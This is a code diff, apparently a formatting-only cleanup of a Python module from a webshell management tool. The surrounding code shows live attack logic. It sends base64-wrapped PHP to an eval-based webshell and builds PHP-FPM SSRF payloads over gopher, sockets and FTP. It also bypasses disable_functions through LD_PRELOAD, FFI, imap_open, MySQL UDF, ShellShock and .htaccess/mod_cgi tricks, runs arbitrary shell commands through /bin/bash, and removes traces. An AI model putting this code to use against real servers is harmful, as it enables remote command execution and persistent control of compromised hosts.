@@ -32,7 +32,7 @@ from libs.functions.php_bp_sys import *
 from libs.functions.php_ini import *
 
 from libs.config import color, gget, gset
-from auxiliary.fpm.fpm import generate_ssrf_payload, generate_ssrf_code_payload,  generate_base64_socks_payload, generate_base64_socks_code_payload, generate_extension
+from auxiliary.fpm.fpm import generate_ssrf_payload, generate_ssrf_code_payload, generate_base64_socks_payload, generate_base64_socks_code_payload, generate_extension
 
 LEVEL = []
 CONNECT_PIPE_MAP = {True: "│  ", False: "   "}
@@ -154,7 +154,7 @@ def human_to_size(size):
     if not match(r' ', size):
         size = sub(r'([KMGT]?B)', r' \1', size)
     number, unit = [string.strip() for string in size.split()]
-    return int(float(number)*UNITS[unit])
+    return int(float(number) * UNITS[unit])
 
 
 def clean_trace():
@@ -288,20 +288,34 @@ def get_db_connect_code(host="", username="", password="", dbname="", port=""):
         return connect_code % temp_code
     return ""
 
+
 def replace_disable_base64(code=""):
-    if gget("webshell.disable_base64_decode","webshell",False):
-        code = code.replace("base64_encode",gget("webshell.base64_en_func","webshell",""))
-        code = code.replace("base64_decode", gget("webshell.base64_de_func", "webshell", ""))
+    if gget("webshell.disable_base64_decode", "webshell", False):
+        code = code.replace(
+            "base64_encode",
+            gget(
+                "webshell.base64_en_func",
+                "webshell",
+                ""))
+        code = code.replace(
+            "base64_decode",
+            gget(
+                "webshell.base64_de_func",
+                "webshell",
+                ""))
     return code
+
 
 def get_sql_command_php(command, database, ruid, luid):
     connect_type = gget("db_connect_type", "webshell")
     connect_code = get_db_connect_code(dbname=database)
     command = base64_encode(command)
     if (connect_type == "pdo"):
-        return get_php_handle__sql_command(connect_type) % (connect_code, command, luid, ruid, luid, ruid)
+        return get_php_handle__sql_command(connect_type) % (
+            connect_code, command, luid, ruid, luid, ruid)
     elif (connect_type == "mysqli"):
-        return get_php_handle__sql_command(connect_type) % (connect_code, command, luid, ruid, luid, ruid)
+        return get_php_handle__sql_command(connect_type) % (
+            connect_code, command, luid, ruid, luid, ruid)
     else:
         return ""
 
@@ -392,13 +406,16 @@ def _fpm_eval_phpcode(url, phpcode, raw_key, password, params_dict):
     sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")
 
     if attack_type == "gopher":
-        phpcode = get_php_fpm_eval(attack_type)% (generate_ssrf_code_payload(host, port, phpcode))
+        phpcode = get_php_fpm_eval(attack_type) % (
+            generate_ssrf_code_payload(host, port, phpcode))
 
     elif attack_type == "sock":
-        phpcode = get_php_fpm_eval(attack_type) % (sock_path, generate_base64_socks_code_payload(host, port, phpcode))
+        phpcode = get_php_fpm_eval(attack_type) % (
+            sock_path, generate_base64_socks_code_payload(host, port, phpcode))
 
     elif attack_type == "http_sock":
-        phpcode= get_php_fpm_eval(attack_type) % (host, port, generate_base64_socks_code_payload(host, port, phpcode))
+        phpcode = get_php_fpm_eval(attack_type) % (
+            host, port, generate_base64_socks_code_payload(host, port, phpcode))
 
     elif attack_type == "ftp":
         php_server_port = gget(
@@ -420,9 +437,14 @@ def _fpm_eval_phpcode(url, phpcode, raw_key, password, params_dict):
                  random_php_server_port, True, "webshell")
             php_server_port = random_php_server_port
 
-        ftp_server_phpcode = get_php_fpm_eval(attack_type) % (host.replace(".", ","), port, random_ftp_port)
+        ftp_server_phpcode = get_php_fpm_eval(attack_type) % (
+            host.replace(".", ","), port, random_ftp_port)
 
-        t = Thread(target=send, kwargs={"phpcode": ftp_server_phpcode, "_in_system_command": True})
+        t = Thread(
+            target=send,
+            kwargs={
+                "phpcode": ftp_server_phpcode,
+                "_in_system_command": True})
         t.setDaemon(True)
         t.start()
         sleep(0.2)
@@ -430,7 +452,8 @@ def _fpm_eval_phpcode(url, phpcode, raw_key, password, params_dict):
         temp_filename = uuid4()
 
         phpcode = """function ob_end_clean(){}ob_start();%s$o=ob_get_clean();$o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));file_put_contents('/tmp/%s',$o);""" % (phpcode, temp_filename)
-        phpcode = """file_put_contents('ftp://%s:%s/a', base64_decode('%s'));sleep(0.8);$fn='%s';print(file_get_contents('http://127.0.0.1:%s/'.$fn));unlink('/tmp/'.$fn);""" % ( host, random_ftp_port, generate_base64_socks_code_payload(host, port, phpcode), temp_filename, php_server_port)
+        phpcode = """file_put_contents('ftp://%s:%s/a', base64_decode('%s'));sleep(0.8);$fn='%s';print(file_get_contents('http://127.0.0.1:%s/'.$fn));unlink('/tmp/'.$fn);""" % (
+            host, random_ftp_port, generate_base64_socks_code_payload(host, port, phpcode), temp_filename, php_server_port)
 
     params_dict[raw_key][password] = phpcode
     res = Session.post(url, verify=False, **params_dict)
@@ -471,7 +494,11 @@ def send(phpcode: str, raw: bool = False, **extra_params):
     head = randstr("!@#$%^&*()[];,.?", offset)
     tail = randstr("!@#$%^&*()[];,.?", offset)
 
-    pwd_b64 = b64encode(gget("webshell.pwd", "webshell", "Lg==").encode()).decode()
+    pwd_b64 = b64encode(
+        gget(
+            "webshell.pwd",
+            "webshell",
+            "Lg==").encode()).decode()
     raw_data = phpcode
 
     if not raw:
@@ -498,9 +525,11 @@ def send(phpcode: str, raw: bool = False, **extra_params):
             php_base64_header = get_php_base64_encode() + get_php_base64_decode()
 
         if (php_v7):
-            phpcode = replace_disable_base64(f"""{php_base64_header}eval(base64_decode("{base64_encode(phpcode)}"));""")
+            phpcode = replace_disable_base64(
+                f"""{php_base64_header}eval(base64_decode("{base64_encode(phpcode)}"));""")
         else:
-            phpcode = replace_disable_base64(f"""{php_base64_header}assert(eval(base64_decode("{base64_encode(phpcode)}")));""")
+            phpcode = replace_disable_base64(
+                f"""{php_base64_header}assert(eval(base64_decode("{base64_encode(phpcode)}")));""")
 
         # -----------------------------------------------------------------------
 
@@ -524,7 +553,8 @@ def send(phpcode: str, raw: bool = False, **extra_params):
 
     try:
         if is_fpm_eval_code and not in_system_command:
-            res = _fpm_eval_phpcode(url, phpcode, raw_key, password, params_dict)
+            res = _fpm_eval_phpcode(
+                url, phpcode, raw_key, password, params_dict)
         else:
             res = Session.post(url, verify=False, **params_dict)
     except requests.RequestException as e:
@@ -563,7 +593,9 @@ def send(phpcode: str, raw: bool = False, **extra_params):
 
     if gget("DEBUG.SEND"):  # DEBUG
         print(color.yellow("-----DEBUG START------"))
-        print(f"[{res.status_code}] {url} length: {len(res.r_text)} time: {res.elapsed.total_seconds()}", end="")
+        print(
+            f"[{res.status_code}] {url} length: {len(res.r_text)} time: {res.elapsed.total_seconds()}",
+            end="")
         print(f"raw: {color.green('True')}" if raw else '')
         for k, v in params_dict.items():
             print(f"{k}: ", end="")
@@ -620,44 +652,55 @@ def prepare_system_template(exec_func: str):
         SYSTEM_TEMPLATE = """$r='/tmp/%s';if(pcntl_fork() === 0) {$cmd = base64_decode("%s");$args = array("-c","$cmd 2>&1 1>$r");pcntl_exec("/bin/bash", $args);exit(0);}pcntl_wait($status);$o=file_get_contents('/tmp/%s');unlink('/tmp/%s');""" % (
             filename, "%s", filename, filename)
 
+
 def get_system_code(command: str, print_result: bool = True, mode: int = 0):
     bdf_mode = gget("webshell.bypass_df", "webshell") if mode == 0 else mode
     print_command = "print($o);" if print_result else ""
     gset("webshell.in_system_command", True, True, "webshell")
 
     if (bdf_mode == 1):  # php7-backtrace
-        return get_php_system(bdf_mode) % (base64_encode(command), print_command)
+        return get_php_system(bdf_mode) % (
+            base64_encode(command), print_command)
 
     elif (bdf_mode == 2):  # php7-gc
-        return get_php_system(bdf_mode) % (base64_encode(command), print_command)
+        return get_php_system(bdf_mode) % (
+            base64_encode(command), print_command)
 
     elif (bdf_mode == 3):  # php7-json
-        return get_php_system(bdf_mode) % (base64_encode(command), print_command)
+        return get_php_system(bdf_mode) % (
+            base64_encode(command), print_command)
 
     elif (bdf_mode == 4):  # LD_PRELOAD
         trigger_code = _get_trigger_func_code(
             gget("webshell.ld_preload_func", "webshell"))
-        return get_php_system(bdf_mode) % (str(uuid4()), base64_encode(command),gget("webshell.ld_preload_path", "webshell"),trigger_code,print_command)
+        return get_php_system(bdf_mode) % (str(uuid4()), base64_encode(command), gget(
+            "webshell.ld_preload_path", "webshell"), trigger_code, print_command)
 
     elif (bdf_mode == 5):  # FFI
-        return get_php_system(bdf_mode) % (base64_encode(command), print_command)
+        return get_php_system(bdf_mode) % (
+            base64_encode(command), print_command)
 
     elif (bdf_mode == 6):  # COM
-        return get_php_system(bdf_mode) % (base64_encode(command), print_command)
+        return get_php_system(bdf_mode) % (
+            base64_encode(command), print_command)
 
     elif (bdf_mode == 7):  # imap_open
         tmpname = str(uuid4())
-        return get_php_system(bdf_mode) % (base64_encode(command), tmpname, tmpname, print_command, tmpname)
+        return get_php_system(bdf_mode) % (base64_encode(
+            command), tmpname, tmpname, print_command, tmpname)
 
     elif (bdf_mode == 8):  # MYSQL-UDF
         connect_type = gget("db_connect_type", "webshell")
         if (connect_type == "pdo"):
-            return get_php_system(bdf_mode)[connect_type] % (get_db_connect_code(), hex_encode(command), print_command)
+            return get_php_system(bdf_mode)[connect_type] % (
+                get_db_connect_code(), hex_encode(command), print_command)
         elif (connect_type == "mysql"):
-            return get_php_system(bdf_mode)[connect_type] % (get_db_connect_code(), hex_encode(command), print_command)
+            return get_php_system(bdf_mode)[connect_type] % (
+                get_db_connect_code(), hex_encode(command), print_command)
 
     elif (bdf_mode == 9):  # php7-SplDoublyLinkedList
-        return get_php_system(bdf_mode) % (print_command, base64_encode(command))
+        return get_php_system(bdf_mode) % (
+            print_command, base64_encode(command))
 
     elif (bdf_mode == 10):  # php-fpm
         bits = gget("webshell.arch", "webshell")
@@ -694,7 +737,8 @@ def get_system_code(command: str, print_result: bool = True, mode: int = 0):
         sleep_time = 1
 
         if attack_type == "gopher":
-            phpcode += get_php_system(bdf_mode)[attack_type] % (generate_ssrf_payload(host, port, ext_upload_path), print_command)
+            phpcode += get_php_system(bdf_mode)[attack_type] % (
+                generate_ssrf_payload(host, port, ext_upload_path), print_command)
         elif attack_type in ["sock", "http_sock"]:
             sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")
             phpcode += """
@@ -711,7 +755,8 @@ def get_system_code(command: str, print_result: bool = True, mode: int = 0):
                 generate_base64_socks_payload(host, port, ext_upload_path))
         elif attack_type == "ftp":
             random_ftp_port = randint(60000, 65000)
-            phpcode += get_php_system(bdf_mode)[attack_type] % (host.replace(".", ","), port, random_ftp_port)
+            phpcode += get_php_system(bdf_mode)[attack_type] % (
+                host.replace(".", ","), port, random_ftp_port)
 
             t = Thread(target=send, kwargs={
                        "phpcode": phpcode, "_in_system_command": True})
@@ -733,7 +778,8 @@ def get_system_code(command: str, print_result: bool = True, mode: int = 0):
 
     elif (bdf_mode == 11):  # apache_mod_cgi
         shellscript_name = randstr(ALPATHNUMERIC, 8) + ".dh"
-        res = send(get_php_system(bdf_mode) % (base64_encode(command), shellscript_name))
+        res = send(get_php_system(bdf_mode) %
+                   (base64_encode(command), shellscript_name))
         real_shellscript_name = res.r_text
 
         # get shellscript url
@@ -748,31 +794,37 @@ def get_system_code(command: str, print_result: bool = True, mode: int = 0):
         # request shellscript url and get result
         res = requests.get(shellscript_url)
         o = base64_encode(res.text.strip())
-        phpcode = """$o=base64_decode('%s');%sunlink('%s');unlink(__DIR__.DIRECTORY_SEPARATOR.".htaccess");rename(__DIR__.DIRECTORY_SEPARATOR.".htaccess.bak", __DIR__.DIRECTORY_SEPARATOR.".htaccess");""" % ( o, print_command, real_shellscript_name)
+        phpcode = """$o=base64_decode('%s');%sunlink('%s');unlink(__DIR__.DIRECTORY_SEPARATOR.".htaccess");rename(__DIR__.DIRECTORY_SEPARATOR.".htaccess.bak", __DIR__.DIRECTORY_SEPARATOR.".htaccess");""" % (
+            o, print_command, real_shellscript_name)
         return phpcode
 
     elif (bdf_mode == 12):  # iconv
         p = "/tmp/%s" % randstr(ALPATHNUMERIC, 8)
         pre_phpcode = get_php_system(bdf_mode) % (p, base64_encode(command))
         send(pre_phpcode, quiet=True)
-        phpcode = """$p="%s";sleep(1);$o=file_get_contents($p);unlink($p);%s""" % (p, print_command)
+        phpcode = """$p="%s";sleep(1);$o=file_get_contents($p);unlink($p);%s""" % (
+            p, print_command)
         return phpcode
 
     elif (bdf_mode == 13):  # FFI-php_exec
-        return get_php_system(bdf_mode) % (base64_encode(command), print_command)
+        return get_php_system(bdf_mode) % (
+            base64_encode(command), print_command)
 
     elif (bdf_mode == 14):  # php7-reflectionProperty
-        return get_php_system(bdf_mode) % (base64_encode(command), print_command)
+        return get_php_system(bdf_mode) % (
+            base64_encode(command), print_command)
 
     elif (bdf_mode == 15):
-        return get_php_system(bdf_mode) % (base64_encode(command), print_command)
+        return get_php_system(bdf_mode) % (
+            base64_encode(command), print_command)
 
     elif (bdf_mode == 16):  # ShellShock
         trigger_code = _get_trigger_func_code(
             gget("webshell.shellshock_func", "webshell"))
         if trigger_code.startswith("mail"):
             trigger_code = 'mail("a@127.0.0.1", "", "", "-bv");'
-        return get_php_system(bdf_mode) % (str(uuid4()), trigger_code, base64_encode(command), print_command)
+        return get_php_system(bdf_mode) % (
+            str(uuid4()), trigger_code, base64_encode(command), print_command)
 
     elif (gget("webshell.exec_func", "webshell") and SYSTEM_TEMPLATE):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
@@ -851,7 +903,8 @@ def open_editor(file_path: str, editor: str = "", edit_args: str = ""):
 def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
     if (is_file):
         pipe = "└─" if (end) else "├─"
-        connect_pipe = "".join([CONNECT_PIPE_MAP[_] for _ in LEVEL[:depth-1]])
+        connect_pipe = "".join([CONNECT_PIPE_MAP[_]
+                               for _ in LEVEL[:depth - 1]])
         try:
             tree_or_node = b64decode(tree_or_node.encode()).decode('gbk')
         except Exception:
@@ -865,7 +918,7 @@ def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
             index += 1
             if (index == len(tree_or_node)):
                 end = True
-            _print_tree(v, depth+1, is_file=True, end=end)  # 输出目录
+            _print_tree(v, depth + 1, is_file=True, end=end)  # 输出目录
     elif (isinstance(tree_or_node, dict)):
         index = 0
         LEVEL.append(True)
@@ -874,12 +927,12 @@ def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
             if (index == len(tree_or_node)):
                 end = True
             if (isinstance(v, (list, dict))):  # 树中树
-                _print_tree(k, depth+1, is_file=True, end=end)  # 输出目录
+                _print_tree(k, depth + 1, is_file=True, end=end)  # 输出目录
                 if (end):
                     LEVEL[depth] = False
-                _print_tree(v, depth+1)  # 递归输出树x
+                _print_tree(v, depth + 1)  # 递归输出树x
             elif (isinstance(v, str)) or v is None:  # 节点
-                _print_tree(v, depth+1, is_file=True, end=end)  # 输出文件
+                _print_tree(v, depth + 1, is_file=True, end=end)  # 输出文件
 
 
 def print_tree(name, tree):
